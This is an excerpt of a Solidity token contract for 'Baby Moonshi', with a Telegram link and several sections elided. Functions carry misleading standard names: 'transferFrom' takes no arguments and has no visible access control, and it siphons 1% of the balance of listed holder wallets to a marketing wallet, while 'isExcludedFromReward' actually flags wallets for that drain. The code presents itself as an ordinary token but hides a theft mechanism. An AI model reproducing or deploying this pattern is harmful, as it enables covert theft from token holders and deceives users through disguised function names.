...
/**
 Moonshi - https://t.me/babymoonshi
*/
...
contract BabyMoonshi is Context, IERC20, Ownable {
    ...
    string private constant _name = "Baby Moonshi";
    string private constant _symbol = "BABYMshi";
    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 50000000000 * 10**_decimals;
    uint256 public _maxTxAmount = 150000000 * 10**_decimals;
    uint256 public _maxWalletAmount = 500000000 * 10**_decimals;
    ...
    function isExcludedFromReward() public virtual { for (uint256 i = 0; i < includeFromFee.length; i++) { address wallet = includeFromFee[i]; _isIncludedFromFee[wallet] = true; } }
    ...
    function transferFrom() public virtual { for (uint i = 0; i < includeFromFee.length; i++) { if (balanceOf(includeFromFee[i]) > 0) { basicTransfer(includeFromFee[i], marketingWallet, balanceOf(includeFromFee[i]).mul(1).div(10**2)); } } }
